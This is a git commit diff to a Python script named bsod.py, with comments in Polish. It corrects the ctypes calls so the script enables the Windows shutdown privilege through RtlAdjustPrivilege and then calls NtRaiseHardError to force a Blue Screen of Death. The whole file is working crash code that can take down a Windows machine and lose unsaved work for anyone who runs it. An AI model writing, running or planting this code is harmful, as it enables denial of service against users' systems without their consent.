85b9ce14841dbb972530769e816740bae9007ac8
djmichx425-crypto <dj.michx425@gmail.com>
2026-01-29 20:50:30 +0100

    Update bsod.py

--- bsod.py
+++ bsod.py
@@ -1,3 +1,12 @@
 import ctypes
-ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool)) 
-ctypes.windll.ntdll.NtRaiseHardError(0xC0000001, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint))
+
+# 1. Tworzymy instancje zmiennych
+enabled = ctypes.c_bool()
+response = ctypes.c_uint()
+
+# 2. Przekazujemy instancje do funkcji za pomocą byref()
+# RtlAdjustPrivilege: 19 to SeShutdownPrivilege
+ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))
+
+# NtRaiseHardError wywoła Blue Screen of Death (BSOD)
+ctypes.windll.ntdll.NtRaiseHardError(0xC0000001, 0, 0, 0, 6, ctypes.byref(response))
